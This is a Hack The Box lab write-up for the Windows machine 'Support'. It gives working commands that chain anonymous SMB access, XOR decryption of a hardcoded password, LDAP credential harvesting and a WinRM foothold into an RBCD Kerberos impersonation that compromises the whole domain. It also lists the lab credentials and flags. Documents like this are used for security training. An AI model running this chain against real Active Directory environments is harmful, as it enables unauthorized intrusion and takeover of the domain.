# HTB — Support

**Difficulty:** Easy | **OS:** Windows | **Type:** Active Directory

## Summary

Anonymous SMB access → .NET binary reverse engineering → LDAP credential extraction → WinRM foothold → RBCD privilege escalation to Domain Admin.

## Attack Chain

| Phase | Technique | Result |
|-------|-----------|--------|
| Recon | Nmap full scan | SMB, LDAP, WinRM, Kerberos identified |
| Initial Access | Anonymous SMB + .NET decompilation | ldap credentials decrypted |
| LDAP Enum | ldapsearch with ldap creds | support user password in `info` field |
| Foothold | evil-winrm as support | user.txt |
| Privesc | RBCD + Kerberos impersonation | Administrator shell — root.txt |

## Key Commands

```bash
# Anonymous SMB enumeration
smbclient -L //TARGET -N
smbclient //TARGET/support-tools -N -c 'get UserInfo.exe.zip'

# Decrypt hardcoded password from Protected.cs
python3 -c "
import base64
enc = '0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E'
key = b'armando'
decoded = base64.b64decode(enc)
print(bytes([b ^ key[i % len(key)] ^ 0xDF for i, b in enumerate(decoded)]).decode())
"

# LDAP enumeration — find password in user attribute
ldapsearch -H ldap://TARGET -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb" "(objectClass=user)" description info

# WinRM foothold
evil-winrm -i TARGET -u support -p 'Ironside47pleasure40Watchful'

# RBCD Attack
python3 addcomputer.py support.htb/support:'Ironside47pleasure40Watchful' \
  -computer-name 'FAKE$' -computer-pass 'Password123!' -dc-ip TARGET

python3 rbcd.py support.htb/support:'Ironside47pleasure40Watchful' \
  -delegate-from 'FAKE$' -delegate-to 'DC$' -action write -dc-ip TARGET

python3 getST.py support.htb/FAKE$:'Password123!' \
  -spn cifs/dc.support.htb -impersonate Administrator -dc-ip TARGET

export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
python3 wmiexec.py -k -no-pass support.htb/Administrator@dc.support.htb
```

## Credentials Found

| User | Password | Source |
|------|----------|--------|
| ldap | nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz | XOR decryption of Protected.cs |
| support | Ironside47pleasure40Watchful | LDAP info attribute |

## Flags

- **user.txt:** `09be92b9ba37b5a976104330f2862e1a`
- **root.txt:** `892d7232e8a091ac6dd1b4511efcb404`

## Key Takeaways

- Anonymous SMB shares can expose sensitive tooling
- .NET binaries are fully reversible — never hardcode secrets
- LDAP attributes (`info`, `description`) are readable by all domain users
- `GenericAll` on a computer object + `SeMachineAccountPrivilege` = full domain compromise via RBCD
- Set `ms-DS-MachineAccountQuota` to 0 to mitigate rogue computer account creation
